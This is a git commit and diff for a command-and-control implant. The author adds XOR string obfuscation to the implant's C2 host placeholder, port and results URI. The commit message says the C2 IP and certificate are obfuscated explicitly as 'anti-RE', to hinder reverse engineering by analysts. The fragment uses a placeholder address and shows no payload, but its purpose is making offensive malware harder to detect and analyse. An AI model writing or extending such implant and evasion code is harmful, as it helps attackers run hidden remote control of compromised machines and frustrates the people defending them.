124819123fbf3e65a03940f6dacbca85c791d5cf
Mitchell Calapai <mitchellcalapai@gmail.com>
2026-04-22 10:16:32 -0400

    Binary Hygiene touches
    XOR on cert, XOR on open places such as C2IP, Port, etc
    XOR decryption will happen on the implant as well, listening post will not have to be edited, this is just anti-RE

--- Implant/main.cpp
+++ Implant/main.cpp
@@ -1,13 +1,14 @@
 #include <stdio.h>
 #include "implant.h"
 #include <boost/system/system_error.hpp>
+#include "xor_string.hpp"
 
 int main()
 {
     //Specify listening post endpoint configuration
-    const auto host = "INSERT YOUR C2 IP";
-    const auto port = "5000";
-    const auto uri = "/results";
+    const auto host = XOR_STR("ENTER C2 IP ADDR"); // added basic xor obfuscation, just in case
+    const auto port = XOR_STR("5000");
+    const auto uri = XOR_STR("/results");
 
     NetSession implant{ host, port, uri };
     implant.start();
